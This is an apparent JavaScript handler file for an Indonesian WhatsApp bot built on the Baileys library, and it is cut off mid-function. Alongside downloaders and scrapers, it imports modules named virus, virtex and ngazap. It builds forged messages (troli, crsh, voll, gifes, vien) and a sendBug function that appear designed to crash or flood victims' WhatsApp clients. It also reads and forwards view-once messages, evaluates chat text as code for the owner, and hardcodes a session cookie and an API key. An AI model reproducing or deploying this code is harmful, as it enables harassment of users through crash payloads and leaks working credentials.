require('./settings')
require('./lib/funclist')
require('./lib/listmenu')
const timeZone = require('moment-timezone')
		        const hours = timeZone().tz('Asia/Jakarta').format('HH:mm:ss')
        if(hours < "23:59:00"){
        var sayyingTime = 'Selamat Malam 🌃'
}
        if(hours < "19:00:00"){
        var sayyingTime = 'Selamat Petang 🌆'
}
        if(hours < "18:00:00"){
        var sayyingTime = 'Selamat Sore 🌅'
}
        if(hours < "15:00:00"){
        var sayyingTime = 'Selamat Siang 🏙'
}
        if(hours < "10:00:00"){
        var sayyingTime = 'Selamat Pagi 🌄'
}
        if(hours < "05:00:00"){
        var sayyingTime = 'Selamat Subuh 🌉'
}
        if(hours < "03:00:00"){
        var sayyingTime = 'Selamat Tengah Malam 🌌'
    }
const { TelegraPH } = require("./lib/TelegraPH.js")
const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, os, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { clockString, tanggal, getTime, isUrl, sleep, runtime, formatp, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/list')
const { buttonvirus } = require('./scrape/buttonvirus')
const { buttonvirus2 } = require('./scrape/buttonvirus2')
const { ngazap } = require('./scrape/ngazap')
const { virtex } = require('./scrape/virtex')
const { virus } = require('./scrape/virus')
const { philips } = require('./scrape/philips')
const { santedpc } = require('./lib/santedpc')
const { santedgc } = require('./lib/santedgc')
const { color, bgcolor } = require('./lib/color')
const { jadibot, conns } = require('./jadibot')
const { uptotelegra } = require('./scrape/upload')
const { dafontSearch, dafontDown } = require('./scrape/dafont')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const anon = require('./lib/menfess')
const scp1 = require('./scrape/scraper') 
const scp2 = require('./scrape/scraperr')
const scp3 = require('./scrape/scraperrr')
const ffstalk = require('./scrape/ffstalk')
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
const mlstalk = require('./scrape/mlstalk')
const textpro = require('./scrape/textpro')
const photooxy = require('./scrape/photooxy')
const yts = require('./scrape/yt-search')
const kirleys = require('@adiwajshing/baileys')
const vm = require('node:vm')
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const db_respon_list = JSON.parse(fs.readFileSync('./database/list.json'))
const pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const dblist = JSON.parse(fs.readFileSync('./database/listall.json'))
global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}
//By Miko
async function pinterest(query) {
return new Promise(async (resolve, reject) => {
axios.get('https://id.pinterest.com/search/pins/?autologin=true&q=' + query, {
headers: {
"cookie": "_auth=1; _b=\"AVna7S1p7l1C5I9u0+nR3YzijpvXOPc6d09SyCzO+DcwpersQH36SmGiYfymBKhZcGg=\"; _pinterest_sess=TWc9PSZHamJOZ0JobUFiSEpSN3Z4a2NsMk9wZ3gxL1NSc2k2NkFLaUw5bVY5cXR5alZHR0gxY2h2MVZDZlNQalNpUUJFRVR5L3NlYy9JZkthekp3bHo5bXFuaFZzVHJFMnkrR3lTbm56U3YvQXBBTW96VUgzVUhuK1Z4VURGKzczUi9hNHdDeTJ5Y2pBTmxhc2owZ2hkSGlDemtUSnYvVXh5dDNkaDN3TjZCTk8ycTdHRHVsOFg2b2NQWCtpOWxqeDNjNkk3cS85MkhhSklSb0hwTnZvZVFyZmJEUllwbG9UVnpCYVNTRzZxOXNJcmduOVc4aURtM3NtRFo3STlmWjJvSjlWTU5ITzg0VUg1NGhOTEZzME9SNFNhVWJRWjRJK3pGMFA4Q3UvcHBnWHdaYXZpa2FUNkx6Z3RNQjEzTFJEOHZoaHRvazc1c1UrYlRuUmdKcDg3ZEY4cjNtZlBLRTRBZjNYK0lPTXZJTzQ5dU8ybDdVS015bWJKT0tjTWYyRlBzclpiamdsNmtpeUZnRjlwVGJXUmdOMXdTUkFHRWloVjBMR0JlTE5YcmhxVHdoNzFHbDZ0YmFHZ1VLQXU1QnpkM1FqUTNMTnhYb3VKeDVGbnhNSkdkNXFSMXQybjRGL3pyZXRLR0ZTc0xHZ0JvbTJCNnAzQzE0cW1WTndIK0trY05HV1gxS09NRktadnFCSDR2YzBoWmRiUGZiWXFQNjcwWmZhaDZQRm1UbzNxc21pV1p5WDlabm1UWGQzanc1SGlrZXB1bDVDWXQvUis3elN2SVFDbm1DSVE5Z0d4YW1sa2hsSkZJb1h0MTFpck5BdDR0d0lZOW1Pa2RDVzNySWpXWmUwOUFhQmFSVUpaOFQ3WlhOQldNMkExeDIvMjZHeXdnNjdMYWdiQUhUSEFBUlhUVTdBMThRRmh1ekJMYWZ2YTJkNlg0cmFCdnU2WEpwcXlPOVZYcGNhNkZDd051S3lGZmo0eHV0ZE42NW8xRm5aRWpoQnNKNnNlSGFad1MzOHNkdWtER0xQTFN5Z3lmRERsZnZWWE5CZEJneVRlMDd2VmNPMjloK0g5eCswZUVJTS9CRkFweHc5RUh6K1JocGN6clc1JmZtL3JhRE1sc0NMTFlpMVErRGtPcllvTGdldz0=; _ir=0"
}
}).then(({
data
}) => {
const $ = cheerio.load(data)
const result = [];
const hasil = [];
$('div > a').get().map(b => {
const link = $(b).find('img').attr('src')
result.push(link)
});
result.forEach(v => {
if (v == undefined) return
hasil.push(v.replace(/236/g, '736'))
})
hasil.shift();
resolve(hasil)
})
})
}






module.exports = Zeltoria = async (Zeltoria, m, chatUpdate, store) => {
try {
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const gakbisaowner = `${ownerNomor}@s.whatsapp.net`
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        const budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await Zeltoria.decodeJid(Zeltoria.user.id)
        const IniZeltoria = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const IniRainchy = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const tahunBaru = new Date('January 1, 2024 00:00:00')
        const sekarang = new Date().getTime()
        const Selisih = tahunBaru - sekarang
        const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
        const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
        const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
        const idulFitri = new Date('April 14, 2023 00:00:00')
        const ayeuna = new Date().getTime()
        const ceIroh = idulFitri - ayeuna
        const hahari = Math.floor( ceIroh / (1000 * 60 * 60 * 24));
        const hajam = Math.floor( ceIroh % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const hamenit = Math.floor( ceIroh % (1000 * 60 * 60) / (1000 * 60))
        const hadetik = Math.floor( ceIroh % (1000 * 60) / 1000)
        const idulAdha = new Date('Juni 29, 2023 00:00:00')
        const nembe = new Date().getTime()
        const ceDadah = idulAdha - nembe
        const hihari = Math.floor( ceDadah / (1000 * 60 * 60 * 24));
        const hijam = Math.floor( ceDadah % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const himenit = Math.floor( ceDadah % (1000 * 60 * 60) / (1000 * 60))
        const hidetik = Math.floor( ceDadah % (1000 * 60) / 1000)
        const UltahCreator = new Date('September 18, 2023 00:00:00')
        const CreatorZeltoria = new Date().getTime()
        const ZeltoriaBotWA = UltahCreator - CreatorZeltoria
        const rainhari = Math.floor( ZeltoriaBotWA / (1000 * 60 * 60 * 24));
        const rainjam = Math.floor( ZeltoriaBotWA % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const rainmenit = Math.floor( ZeltoriaBotWA % (1000 * 60 * 60) / (1000 * 60))
        const raindetik = Math.floor( ZeltoriaBotWA % (1000 * 60) / 1000)
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await Zeltoria.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPrem = prem.includes(m.sender)
    	const isUser = pendaftar.includes(sender)
    	const banUser = await Zeltoria.fetchBlocklist()
        const isBanned = banUser ? banUser.includes(m.sender) : false
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	const isEval = body.startsWith('=>');
    	//m.reply(`${body}`)

		if (isEval && senderNumber == "6281916619735") {
			let evaled,
				text = q,
				{ inspect } = require('util');
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					);
					m.reply(evaled);
				}
				evaled = await eval(text);
				if (typeof evaled !== 'string') evaled = inspect(evaled);
				await Zeltoria.sendMessage(from, { text: evaled }, { quoted: m });
			} catch (e) {
				Zeltoria.sendMessage(from, { text: String(e) }, { quoted: m });
			}
		}
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premium: false
}
} catch (err) {
console.error(err)
}

if (!Zeltoria.public) {
if (!m.key.fromMe) return
}

var mdu = ['red','green','yellow','blue','magenta','cyan','white']
var halalu = mdu[Math.floor(Math.random() * mdu.length)]
var mdo = ['red','green','yellow','blue','magenta','cyan','white']
var halalo = mdo[Math.floor(Math.random() * mdo.length)]
var mdi = ['red','green','yellow','blue','magenta','cyan','white']
var halali = mdi[Math.floor(Math.random() * mdi.length)]
var mda = ['red','green','yellow','blue','magenta','cyan','white']
var halala = mda[Math.floor(Math.random() * mda.length)]
var mde = ['red','green','yellow','blue','magenta','cyan','white']
var halale = mde[Math.floor(Math.random() * mde.length)]

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(' - Rainchy '), color(`[ PESAN ]`, `${halalu}`), color(`FROM`, `${halalo}`), color(`${pushname}`, `${halali}`), color(`Text :`, `${halala}`), color(`${body}`, `${halale}`))
}

if (isCmd && !isUser) {
pendaftar.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))
}

Zeltoria.sendPresenceUpdate('unavailable', from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Jangan Tag Dia!
Dia Sedang AFK ${reason ? 'Dengan Alasan ' + reason : 'Tanpa Alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}

if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`
Kamu Berhenti AFK${user.afkReason ? ' Setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

if (m.sender.startsWith('212')) return Zeltoria.updateBlockStatus(m.sender, 'block')

async function sendZeltoriaMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await Zeltoria.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

const sendSticker = (pesan) => {
Zeltoria.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
}

try {
ppuser = await Zeltoria.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await reSize(ppuser, 300, 300)

const sendvn = (teks) => {
Zeltoria.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}

for (let anju of vnnye) {
if (budy === anju) {
let buffer = fs.readFileSync(`./database/Audio/${anju}.mp3`)
sendvn(buffer)
}
}


if (m.isGroup && m.mtype == 'viewOnceMessage') {
let teks = `╭「 *Anti ViewOnce* 」\n├ *Name* : ${pushname}\n├ *User* : @${m.sender.split("@")[0]}\n├ *Clock* : ${wib} WIB\n└ *Message* : ${m.mtype}`
Zeltoria.sendMessage(m.chat, { text: teks, mentions: [m.sender] }, { quoted: m })
await sleep(500)
m.copyNForward(m.chat, true, {readViewOnce: true}, {quoted: m}).catch(_ => m.reply('Mungkin Dah Dibuka'))
}

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption":  `Rainchy`, 
"jpegThumbnail": ppnyauser
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: '6281916619735@s.whatsapp.net' } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: ppnyauser } } }

const troli = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
},
message: {
orderMessage: {
itemCount : 999999999999999999,
status: 99999999999999999999,
surface : 9999999999999999,
message: virus,
orderTitle: virus,
thumbnail: ppnyauser,
sellerJid: '0@s.whatsapp.net'
},
},
};

const reply = (teks) => {
Zeltoria.sendMessage(from, { text: teks ,
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}
}, { quoted : m })
}

const banRep = () => {
Zeltoria.sendMessage(m.chat, {
text:`Maaf Anda Sudah Di Banned Silahkan Chat @${creator.split("@")[0]} Untuk Membuka Nya`,
mentions: [creator],
},
{
quoted:m
})
}

if (isCmd && isBanned) {
return banRep()
}

const crsh = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `Hᴀᴢᴀʀᴅ Bot WhatsApp${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

let list = []
for (let i of owner) {
list.push({
displayName: await Zeltoria.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await Zeltoria.getName(i + '@s.whatsapp.net')}\n
FN:${await Zeltoria.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:rakrohaku@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://instagram.com/fahrul_mt
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

const voll = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
},
"message": {
"pollCreationMessage": {
"name": `F.A BOTZ${virus}${virtex(prefix)}`,
"options": [
	{
"optionName": "KATANYA WA KEBAL"
	},
	{
"optionName": "BERANI VOTE GA"
	},
	{
"optionName": "VOTE LAH SEMUA"
	},
	{
"optionName": "KATANYA KEBAL"
	},
	{
"optionName": "SALAM DARI Zeltoria BOT"
	}
],
"selectableOptionsCount": 5
}}}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: 'Rainchy',
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: 'Creator F.A Bot'
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "USD"
			}
		}
	}
}

const gifes = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
},
"message": { 
"videoMessage": { 
"title": `${virtex(prefix)}`,
"h": `${virus}`,
'duration': '99999', 
'gifPlayback': 'true', 
'caption': `${virus}${virtex(prefix)}`,
'jpegThumbnail': ppnyauser
}}}

const vien = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"orderMessage": {
"orderId": "594071395007984",
"thumbnail": ppnyauser,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `F.A BOTZ WhatsApp${ngazap(prefix)}`,
"orderTitle": "F.A BOTZ WhatsApp${ngazap(prefix)}",
"sellerJid": "6281916619735@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR"
}}}

let rn = ['recording','composing']
let jd = rn[Math.floor(Math.random() * rn.length)];

if (command) {
Zeltoria.sendPresenceUpdate(jd, from)
Zeltoria.readMessages([m.key])
}

function simpan(path, buff) {
    fs.writeFileSync(path, buff)
    return path
}
function getRandom(ext) {
    ext = ext || ""
    return `${Math.floor(Math.random() * 100000)}.${ext}`
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await Zeltoria.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Nama Channel : ${ghed.player_response.videoDetails.author}
Link Channel : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Durasi : ${Lehd.meta.duration}
Deskripsi : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await Zeltoria.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await Zeltoria.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Nama Channel : ${PlXz.player_response.videoDetails.author}
Link Channel : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Durasi : ${Puxa.meta.duration}
Deskripsi : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await Zeltoria.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}

async function sendPoll(jid, text, list) {
Zeltoria.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function bygbt(text) {
Zeltoria.sendMessage(text, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}

const sendBug = async (target) => {
Zeltoria.sendMessage(target, {
text: '', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `Kepo`}},
{ urlButton: { displayText: `Owner`, url: `https://wa.me/Kepo`}},
{ urlButton: { displayText: `ID GORUP`, url: `https://www.whatsapp.com/otp/copy/${from}`}},
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `Kepo`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/Kepo`}},
{ urlButton: { displayText: `ID GORUP`, url: `https://www.whatsapp.com/otp/copy/${from}`}},
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `Kepo`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/Kepo`}},
{ urlButton: { displayText: `ID GORUP`, url: `https://www.whatsapp.com/otp/copy/${from}`}},
{ quickReplyButton: { displayText: `Rules`, id: `${prefix}rules`}},
{ quickReplyButton: { displayText: `Info`, id: `${prefix}x`}},
{ quickReplyButton: { displayText: `Sewa`, id: `${prefix}sewa`}}]}
)
}

const botzZeltoria = "6285712408309"
const mark = "0@s.whatsapp.net"
const timestamp = speed()
const latensi = speed() - timestamp
const butlocNye = [
{buttonId: `${prefix}allmenu`, buttonText: {displayText: 'All Menu'}, type: 1},
{buttonId: `${prefix}listmenu`, buttonText: {displayText: 'List Menu'}, type: 1},
]
const buttonLocnya = {
image: fs.readFileSync('./image/thumb.png'),
caption: `Hai Kak @${sender.split("@")[0]} 
Jika Ingin Berhasil Jangan Menunggu Termotivasi Dulu Baru Bergerak, Tapi Bergeraklah Terlebih Dahulu, Maka Dirimu Akan Termotivasi Dengan Sendirinya.

Nama ${IniZeltoria ? 'Owner' : 'User'} : ${pushname}
Nomor ${IniZeltoria ? 'Owner' : 'User'} : ${sender.split("@")[0]}
Jumlah User : ${pendaftar.length} User
Status : ${IniZeltoria ? 'Owner' : 'User'}
Status Premium : ${isPrem ? 'Premium User' : 'Free User'}
Sistem Berjalan : ${runtime(process.uptime())}
Kecepatan Sistem : ${latensi.toFixed(4)} Detik
Tahun Baru : ${jhari} Hari ${jjam} Jam ${jmenit} Menit ${jdetik} Detik
Idul Fitri : ${hahari} Hari ${hajam} Jam ${hamenit} Menit ${hadetik} Detik
Idul Adha : ${hihari} Hari ${hijam} Jam ${himenit} Menit ${hidetik} Detik
Ultah Creator : ${rainhari} Hari ${rainjam} Jam ${rainmenit} Menit ${raindetik} Detik
`,
mentions : [sender, botzZeltoria, mark],
footer: `Created By @${botzZeltoria.split("@")[0]}
WhatsApp By @${mark.split("@")[0]}`,
buttons: butlocNye,
headerType: "PHOTO"
}

async function rmbg(buffer) {
let form = new FormData
form.append("size", "auto")
form.append("image_file", fs.createReadStream(buffer), "ntah.webp")
let res = await axios({
  url: "https://api.remove.bg/v1.0/removebg",
  method: "POST",
  data: form,
  responseType: "arraybuffer",
  headers: {
    "X-Api-Key": "dNaWDqPDEuzQTHDba6TACk57",
    ...form.getHeaders()
  }
})
return res.data
}

async function getFile(media) {
        let data = Buffer.isBuffer(media) ? media : isUrl(media) ? await ( await fetch(media)).buffer() : fs.existsSync(media) ? fs.readFileSync(media) : /^data:.*?\/.*?;base64,/i.test(media) ? Buffer.from(media.split(",")[1]) : null
        if (!data) return new Error("Result is not a buffer")
        let type = await FileType.fromBuffer(data) || {
          mime: "application/octet-stream",
          ext: ".bin"
        }
        return {
          data,
          ...type
        }
      }

async function sendFile(jid, media, options={}) {
let file = await getFile(media)
let mime = file.ext, type
if (mime == "mp3") {
type = "audio"
options.mimetype = "audio/mpeg"
options.ptt = options.ptt || false
}
else if (mime == "jpg" || mime == "jpeg" || mime == "png") type = "image"
else if (mime == "webp") type = "sticker"
else if (mime == "mp4") type = "video"
else type = "document"
return gans.sendMessage(jid, { [type]: file.data, ...options }, { ...options })
}

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
